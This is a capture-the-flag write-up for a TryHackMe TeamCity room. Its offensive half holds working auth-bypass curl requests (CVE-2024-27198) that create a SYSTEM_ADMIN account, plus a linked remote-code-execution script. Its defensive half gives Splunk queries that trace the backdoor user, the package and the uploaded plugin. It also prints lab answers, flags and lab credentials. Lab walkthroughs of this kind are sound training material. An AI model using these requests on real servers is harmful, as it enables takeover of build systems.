# brains

# Task 1 - Red: Exploit the Server!

Welcome to the Brains challenge, part of TryHackMe’s Hackathon!

All brains gathered to build an engineering marvel; however, it seems strangers had found away to get in.  

Start by deploying the machine; click on the `Start Machine` button in the upper-right-hand corner of this task to deploy the virtual machine for this room.

**Note:** Please allow the machine 4 - 6 minutes to fully boot.


## Escaneo

```
┌──(venv)─(root㉿kali)-[/home/kali/tmp/tryhackme/brains]
└─# nmap -sV -n -Pn --min-rate 5000 -p- -v -oN nmap 10.81.177.195
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-20 19:23 CST
Nmap scan report for 10.81.177.195
Host is up (0.18s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
37485/tcp open  java-rmi Java RMI
50000/tcp open  http     Apache Tomcat (language: en)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.73 seconds
           Raw packets sent: 74356 (3.272MB) | Rcvd: 74351 (2.974MB)

```


## Explotacion

```
┌──(kali㉿kali)-[~/tmp/tryhackme-advent-2025]
└─$ curl -ik 'http://10.81.177.195:50000/hax?jsp=/app/rest/server;.jsp'

HTTP/1.1 200 
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store
Content-Type: application/xml;charset=ISO-8859-1
Content-Language: en
Content-Length: 796
Date: Sun, 21 Dec 2025 03:09:35 GMT

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><server version="2023.11.3 (build 147512)" versionMajor="2023" versionMinor="11" startTime="20251221T011904+0000" currentTime="20251221T030935+0000" buildNumber="147512" buildDate="20240129T000000+0000" internalId="dfe695de-193a-4379-aa85-1757839c83f0" role="main_node" webUrl="http://brains.thm:50000" artifactsUrl=""><projects href="/app/rest/projects"/><vcsRoots href="/app/rest/vcs-roots"/><builds href="/app/rest/builds"/><users href="/app/rest/users"/><userGroups href="/app/rest/userGroups"/><agents href="/app/rest/agents"/><buildQueue href="/app/rest/buildQueue"/><agentPools href="/app/rest/agentPools"/><investigations href="/app/rest/investigations"/><mutes href="/app/rest/mutes"/><nodes href="/app/rest/server/nodes"/></server> 
```

### Agregar usuario
```
curl -ik http://brains.thm:50000/hax?jsp=/app/rest/users\;.jsp -X POST -H "Content-Type: application/json" --data "{\"username\": \"0xb0b\", \"password\": \"0xb0b\", \"email\": \"0xb0b\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}"
HTTP/1.1 200 
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store
Content-Type: application/xml;charset=ISO-8859-1
Content-Language: en
Content-Length: 661
Date: Sun, 21 Dec 2025 03:13:16 GMT

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="0xb0b" id="11" email="0xb0b" href="/app/rest/users/id:11"><properties count="3" href="/app/rest/users/id:11/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="0xb0b"/><property name="teamcity.server.buildNumber" value="147512"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:11/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>   
```

## Exploit 2

https://raw.githubusercontent.com/W01fh4cker/CVE-2024-27198-RCE/refs/heads/main/CVE-2024-27198-RCE.py

```
python exp.py -t http://brains.thm:50000

command > cat /home/ubuntu/flag.txt
THM{faa9bac345709b6620a6200b484c7594}
```


# Task 2 - Blue: Let's Investigate

Now comes the detection part.  
  
The IT department has provided us one of the servers which was compromised as a result of the attack. Our task as a Forensics Analyst is to examine the host and identify the attacker's footprints in the post-exploitation stage.

Lab Connection

Before moving forward, deploy the machine. When you deploy the machine, it will be assigned an IP address: `10.82.134.126`. The Splunk instance will  be accessible in about **5 minutes** and can be accessed at `10.82.134.126:8000` using the credentials mentioned below:  

**Username: `splunk`**

**Password: `analyst123`**


## Answer the questions below

What is the name of the backdoor user which was created on the server after exploitation?  

 ```
index=* "new user"

eviluser
```

What is the name of the malicious-looking package installed on the server?  

 ```
 index=* source="/var/log/dpkg.log" "installed"
 
 2024-07-04 22:58:25 status installed datacollector:amd64 1.0
 
 datacollector
 ```

What is the name of the plugin installed on the server after successful exploitation?

```
index=* source="/opt/teamcity/TeamCity/logs/teamcity-activities.log"


[2024-07-04 22:08:31,921]   INFO - s.buildServer.ACTIVITIES.AUDIT - plugin_uploaded: Plugin "AyzzbuXY" was updated by "user with id=11" with comment "Plugin was uploaded to /home/ubuntu/.BuildServer/plugins/AyzzbuXY.zip"

AyzzbuXY.zip

```